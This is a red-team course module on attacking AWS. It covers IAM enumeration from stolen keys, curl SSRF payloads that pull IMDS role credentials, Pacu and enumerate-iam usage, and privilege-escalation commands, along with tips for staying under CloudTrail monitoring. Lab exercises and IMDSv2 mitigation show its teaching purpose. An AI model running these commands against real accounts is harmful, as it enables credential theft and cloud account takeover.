---
title: "Cloud Red Teaming — AWS Attack Surface and IAM Enumeration"
tags: [red-team, cloud, AWS, IAM, enumeration, privilege-escalation, S3, EC2,
  metadata, IMDS, ATT&CK, T1078.004, T1552.005, T1098.003]
module: 08-RedTeam-03
day: 523
related_topics:
  - C2 OPSEC (Day 522)
  - AWS Exploitation Lab (Day 524)
  - Cloud Exploitation R-09 (curriculum reference)
  - SSRF and Server-Side Attacks (curriculum reference)
---

# Day 523 — Cloud Red Teaming: AWS Attack Surface

> "AWS is Active Directory with APIs. The domain controller is IAM. The service
> accounts are IAM roles. The group policy is SCP. The attack paths are the same:
> find a credential, enumerate what that credential can do, find a path to
> AdministratorAccess. The tool names change. The logic does not."
>
> — Ghost

---

## Goals

Understand the AWS security model: accounts, IAM, roles, policies, SCPs.
Enumerate IAM permissions from a compromised credential using the principle
of least-information-revealed enumeration.
Identify the high-value attack paths in AWS IAM misconfiguration.
Understand the Instance Metadata Service (IMDS) and why SSRF to IMDS is
the AWS equivalent of LSASS dump.

**Prerequisites:** Day 521–522 (C2 infrastructure), basic AWS familiarity,
understanding of API authentication concepts.
**Time budget:** 5 hours.

---

## Part 1 — The AWS Security Model

```
AWS account: the top-level container. Analogous to a Windows domain.

IAM (Identity and Access Management):
  → Controls who can call which API in which account
  → Principal types: IAM User, IAM Role, AWS Service, Federated Identity
  → Policies: JSON documents attached to principals defining Allow/Deny
  → Resource policies: attached to resources (S3 bucket, SQS queue)
    controlling who can access them from any account

IAM Role vs IAM User:
  User: has long-term credentials (Access Key ID + Secret Access Key)
        stored in ~/.aws/credentials or environment variables
        → Leaked once → attacker has persistent access

  Role: has no long-term credentials; assumes a temporary session
        (STS AssumeRole) that expires after 1–12 hours
        → When EC2, Lambda, or ECS assumes a role, the temporary
          credentials are available via IMDS (metadata service)

Service Control Policies (SCPs):
  → Applied at the AWS Organization level (above accounts)
  → Can explicitly deny API calls even if IAM allows them
  → Example: SCP blocks all EC2 in regions except us-east-1
  → As an attacker: you cannot bypass SCPs with any IAM permission

Attack entry points (in order of frequency in real engagements):
  1. Leaked IAM User credentials in code, CI/CD, or public repos
  2. SSRF vulnerability on an EC2 instance → IMDS credential theft
  3. Misconfigured S3 bucket with sensitive data (secrets, backups)
  4. Overly permissive Lambda function execution role
  5. Publicly exposed EC2 with SSH/RDP (traditional foothold into cloud)
  6. Phishing for AWS SSO / federated identity (less common)
```

---

## Part 2 — IAM Enumeration from Compromised Credentials

### Step 1: Identify What You Have

```bash
# Configure the stolen credentials:
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Optional: session token if role-assumed credentials
export AWS_SESSION_TOKEN=AQoDYXdzEJr...

# Who am I?
aws sts get-caller-identity
# Output:
# {
#   "UserId":  "AIDAIOA3BFAWEXAMPLE",
#   "Account": "123456789012",
#   "Arn":     "arn:aws:iam::123456789012:user/jsmith"
# }
# → Account ID, ARN (user or role), user ID

# If this is a role: the Arn will show "assumed-role" instead of "user"
# arn:aws:sts::123456789012:assumed-role/EC2DevRole/i-0abc12345def67890

# Key information extracted:
#   Account ID: 123456789012
#   Principal: jsmith (user) or EC2DevRole (role)
#   → Account ID is needed for all cross-account operations
```

### Step 2: Enumerate Attached Policies

```bash
# List policies attached directly to this user:
aws iam list-attached-user-policies --user-name jsmith
# → Shows: managed policies attached directly

# List inline policies:
aws iam list-user-policies --user-name jsmith
aws iam get-user-policy --user-name jsmith --policy-name POLICY_NAME
# → Inline policy JSON

# List groups the user belongs to (group policies apply):
aws iam list-groups-for-user --user-name jsmith

# For each group: list attached policies:
aws iam list-attached-group-policies --group-name GROUPNAME

# Get the actual policy document (what this user can do):
aws iam get-policy-version \
    --policy-arn arn:aws:iam::123456789012:policy/DevPolicy \
    --version-id v1
# → Full JSON policy with Allow/Deny statements

# PROBLEM: low-privilege users often cannot call iam:List* or iam:Get*
# → Use enumerate-iam or aws-whoami for blind enumeration (Part 4)
```

### Step 3: Enumerate Accessible Services

```bash
# Try common read operations to fingerprint what this credential can access:
# (Each call that succeeds reveals a permission)

# EC2:
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,Tags]'
aws ec2 describe-security-groups
aws ec2 describe-iam-instance-profiles

# S3:
aws s3 ls                              # list all buckets in account
aws s3 ls s3://BUCKET_NAME             # list a specific bucket
aws s3 cp s3://BUCKET_NAME/key /tmp/   # read a specific object

# Lambda:
aws lambda list-functions
aws lambda get-function --function-name FUNCTION_NAME  # includes download URL

# Secrets Manager and Parameter Store (high-value targets):
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# CloudFormation (often contains credentials in stack parameters or outputs):
aws cloudformation list-stacks
aws cloudformation get-template --stack-name STACK_NAME

# ECR (container registry — images may contain hardcoded secrets):
aws ecr describe-repositories
aws ecr get-login-password | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com
docker pull ACCOUNT.dkr.ecr.REGION.amazonaws.com/REPO:latest

# IAM roles that can be assumed (AttackPath: can we assume a higher-priv role?):
aws iam list-roles --query 'Roles[].[RoleName,Arn]'
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole \
    --role-session-name testSession
# → If this succeeds: you now have AdminRole credentials
```

---

## Part 3 — IMDS: The AWS Credential Goldmine

### What IMDS Is

```
Instance Metadata Service (IMDS): a non-routable HTTP endpoint available from
WITHIN an EC2 instance at 169.254.169.254 (link-local, not internet-routable).

Available at:
  http://169.254.169.254/latest/meta-data/

What it exposes (among many fields):
  → The IAM role credentials for the role attached to this EC2 instance
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  → Returns: AccessKeyId, SecretAccessKey, Token, Expiration
  → These are STS temporary credentials valid for up to 6 hours

Why this matters:
  Any code running on the EC2 instance — including SSRF vulnerabilities in
  web applications — can access this endpoint.
  An attacker who exploits SSRF to reach 169.254.169.254 gets the EC2's
  attached IAM role credentials. If that role has AdministratorAccess:
  full account compromise.
```

### SSRF to IMDS: Attack Pattern

```bash
# Target: a web application with SSRF vulnerability (e.g. URL parameter
# that fetches content from an arbitrary URL)

# Step 1: Probe for SSRF
curl "https://target-app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# If vulnerable: response contains EC2 metadata listing

# Step 2: Get the role name
curl "https://target-app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: EC2AppRole (the name of the attached IAM role)

# Step 3: Get the role credentials
curl "https://target-app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2AppRole"
# Response:
# {
#   "Code":            "Success",
#   "LastUpdated":     "2024-01-15T08:00:00Z",
#   "Type":            "AWS-HMAC",
#   "AccessKeyId":     "ASIAIOSFODNN7EXAMPLE",
#   "SecretAccessKey": "wJalrXUtnFEM...",
#   "Token":           "AQoDYXdzEJr...",
#   "Expiration":      "2024-01-15T14:00:00Z"
# }

# Step 4: Use the credentials
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEM...
export AWS_SESSION_TOKEN=AQoDYXdzEJr...
aws sts get-caller-identity
# → Full access as EC2AppRole
```

### IMDSv2 — The Mitigation

```bash
# IMDSv2 (introduced 2019): requires a session token for all metadata requests
# 1. First: PUT request to get a session token (TTL: 1–21600 seconds)
# 2. Then: GET request with the session token in a header

# IMDSv2 SSRF resistance:
#   The PUT request requires a custom header (X-aws-ec2-metadata-token-ttl-seconds)
#   Most SSRF vulnerabilities cannot add custom headers to the server-side request
#   → SSRF that only controls the URL cannot obtain the session token
#   → IMDSv2 blocks the most common SSRF-to-IMDS attack

# Check if IMDSv2 is enforced:
aws ec2 describe-instances --instance-ids i-INSTANCEID \
    --query 'Reservations[].Instances[].MetadataOptions'
# → HttpTokens: "required" = IMDSv2 enforced (good)
# → HttpTokens: "optional" = IMDSv1 still works (vulnerable to SSRF)

# Exploitation with IMDSv1 (optional):
# Direct from inside the EC2 (shell access, no header needed):
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

---

## Part 4 — Automated IAM Enumeration

### enumerate-iam

```bash
# enumerate-iam: brute-forces IAM permissions by calling every AWS API
# and recording which calls return 200 vs AccessDenied
# Generates a full permission list even without iam:List* access

pip install enumerate-iam
python3 enumerate_iam.py \
    --access-key AKIAIOSFODNN7EXAMPLE \
    --secret-key wJalrXUtnFEM... \
    --region us-east-1

# Output: a list of all API calls that succeed (= permissions the credential has)
# Example output:
#   [+] lambda.list_functions
#   [+] s3.list_buckets
#   [+] ec2.describe_instances
#   [-] iam.list_users (AccessDenied)
#   [+] secretsmanager.list_secrets

# IMPORTANT: generates significant CloudTrail noise (hundreds of API calls)
# Use only when you have already decided to enumerate aggressively or when
# the engagement scope allows it
```

### Pacu — AWS Exploitation Framework

```bash
# Pacu: the AWS equivalent of Metasploit
# Modules for enumeration, privilege escalation, persistence, and exfil

pip install pacu

# Start Pacu:
pacu

# Set credentials:
Pacu (session) > set_keys
Pacu (session) > set_region us-east-1

# Enumerate IAM (low-noise — uses only standard list/get calls):
Pacu (session) > run iam__enum_users_roles_policies_groups

# Find privilege escalation paths:
Pacu (session) > run iam__privesc_scan
# → Lists all known IAM privilege escalation paths given the current permissions
# → Maps to "which additional permission would give me AdministratorAccess?"

# Enumerate S3 for sensitive data:
Pacu (session) > run s3__bucket_finder
Pacu (session) > run s3__download_bucket --bucket BUCKET_NAME

# EC2 metadata theft:
Pacu (session) > run ec2__steal_instance_credentials
```

---

## Part 5 — High-Value IAM Privilege Escalation Paths

```
IAM privilege escalation: a lower-privilege principal uses a permitted API
call to grant itself (or another principal) higher privileges.

(Rhino Security Labs documented ~20+ IAM priv esc paths in 2018-2022)

Path 1: iam:CreatePolicyVersion (overwrite an existing policy)
  → If you can create a new version of an existing policy, set it as default
    and add AdministratorAccess
  aws iam create-policy-version --policy-arn POLICY_ARN \
      --policy-document '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
      --set-as-default

Path 2: iam:AttachUserPolicy (attach a managed policy to yourself)
  → Attach the AWS-managed AdministratorAccess policy to your own user
  aws iam attach-user-policy --user-name jsmith \
      --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

Path 3: iam:CreateAccessKey (create access key for another user)
  → If you can create an access key for an admin user, use that key
  aws iam create-access-key --user-name AdminUser
  # → New Access Key ID + Secret for AdminUser (if AdminUser exists)

Path 4: sts:AssumeRole on a permissive role
  → If any high-privilege role has a trust policy that allows your user
    or account to assume it:
  aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole \
      --role-session-name attacker
  # → Temporary credentials as AdminRole

Path 5: lambda:CreateFunction + lambda:InvokeFunction + iam:PassRole
  → Create a Lambda function with an admin role attached
  → The function runs as the admin role; call any AWS API from it
  → Execute the function, extract credentials or perform admin actions

Path 6: ec2:RunInstances + iam:PassRole
  → Launch a new EC2 instance with an admin role attached
  → The EC2's IMDS exposes the admin role credentials
  aws ec2 run-instances --image-id ami-XXXX \
      --instance-type t2.micro \
      --iam-instance-profile Name=AdminProfile
  # → New EC2 running with admin role → IMDS → admin credentials
```

---

## Key Takeaways

1. IAM is the domain controller of AWS. Owning a principal with
   `iam:AttachUserPolicy` or `iam:CreatePolicyVersion` is equivalent to owning a
   DA account in Active Directory. Every IAM privilege escalation path leads back
   to one of a handful of powerful API permissions.
2. SSRF to IMDS is the most high-value cloud vulnerability class. Any web
   application running on EC2 with an attached IAM role is one SSRF away from a
   full AWS account compromise — if IMDSv2 is not enforced. Check
   `HttpTokens: required` on every EC2 instance.
3. Leaked IAM User credentials are persistent. Unlike role credentials (which
   expire), IAM User access keys are valid indefinitely until rotated or deleted.
   A leaked access key in a GitHub repo from three years ago may still work. Check
   trufflehog or gitleaks output on any target's public repos.
4. `sts:get-caller-identity` is always permitted — every IAM principal can call it
   with any valid credential. Use it as the first call to determine what you have
   without generating unusual CloudTrail patterns.
5. enumerate-iam generates significant CloudTrail noise. In engagements where
   stealth matters, enumerate manually (targeted API calls based on the service
   stack you observe). Use enumerate-iam only when aggressive enumeration is
   acceptable or when you suspect the SOC is not monitoring CloudTrail.

---

## Exercises

1. Set up a lab AWS account (free tier). Create an IAM user `jsmith` with only
   `AmazonEC2ReadOnlyAccess`. Run `aws ec2 describe-instances` and
   `aws s3 ls` — note which succeeds and which fails. Then run `enumerate-iam`
   and compare its output to the policy definition.
2. Launch an EC2 instance in the lab with an IAM role that has `s3:ListBuckets`
   attached. SSH into the instance. Retrieve the role credentials via IMDSv1
   (`curl 169.254.169.254/...`). Verify they work: `aws s3 ls`. Then enforce
   IMDSv2 on the instance and verify the old curl command fails.
3. Create a lab IAM user with `iam:CreatePolicyVersion` on a specific policy ARN.
   Execute privilege escalation Path 1 from Part 5: overwrite the policy to add
   `AdministratorAccess`. Verify by calling `aws sts get-caller-identity` and then
   `aws iam list-users` (which requires admin).
4. Run `trufflehog filesystem --directory /path/to/a/local/repo` on a demo repo
   containing a fake AWS key (`AKIA...` pattern). Verify trufflehog detects it.
   Understand why preventing keys from entering repos is more important than
   rotating them after the fact.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q523.1, Q523.2 …).

---

## Navigation

← Previous: [Day 522 — C2 OPSEC](DAY-0522-C2-OPSEC.md)
→ Next: [Day 524 — AWS Exploitation Lab](DAY-0524-AWS-Exploitation-Lab.md)
